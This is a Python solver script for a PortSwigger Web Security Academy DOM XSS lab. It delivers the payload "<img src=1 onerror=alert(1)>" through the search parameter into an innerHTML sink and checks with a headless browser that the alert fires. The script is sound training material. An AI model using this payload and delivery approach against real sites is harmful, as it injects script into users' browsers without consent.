#!/usr/bin/env python3
"""
DOM XSS in innerHTML sink using source location.search
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 04-dom-xss-innerhtml-sink.md

What this does:
    Another pure client-side sink -- location.search flows into an innerHTML
    assignment. innerHTML parses the string as HTML but browsers won't
    execute a <script> tag inserted that way, so the payload uses an <img>
    with a broken src and an onerror handler instead, which fires normally
    through innerHTML. Delivers the payload and confirms execution with a
    headless browser listening for the alert() dialog.

Usage:
    python 04-dom-xss-innerhtml-sink.py <lab-url>
    e.g. python 04-dom-xss-innerhtml-sink.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

# innerHTML strips/never-executes <script> tags, so use an event handler instead.
PAYLOAD = "<img src=1 onerror=alert(1)>"


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    url = f"{lab_url}/?search={urllib.parse.quote(PAYLOAD)}"
    print(f"[*] Payload: {PAYLOAD}")
    print(f"[*] Delivering to: {url}")

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'}")

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
